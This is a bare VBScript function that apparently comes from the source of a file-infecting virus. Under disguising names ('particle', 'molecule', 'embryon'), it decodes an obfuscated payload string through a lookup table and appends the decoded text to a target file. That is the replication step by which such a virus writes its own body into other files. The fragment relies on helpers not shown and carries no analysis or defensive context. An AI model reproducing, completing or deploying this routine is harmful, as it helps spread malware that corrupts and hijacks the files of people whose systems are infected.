function inject(particle, body)
molecule = ""
for i = 1 to len(particle)/2
atom = mid(particle, (i*2)-1, 2)
if atom = "89" then
molecule = molecule & chr(34)
else
molecule = molecule & codes(atom)
end if
next
Set embryon = fso.OpenTextFile(body, 8)
embryon.WriteLine(molecule)
embryon.Close
end function
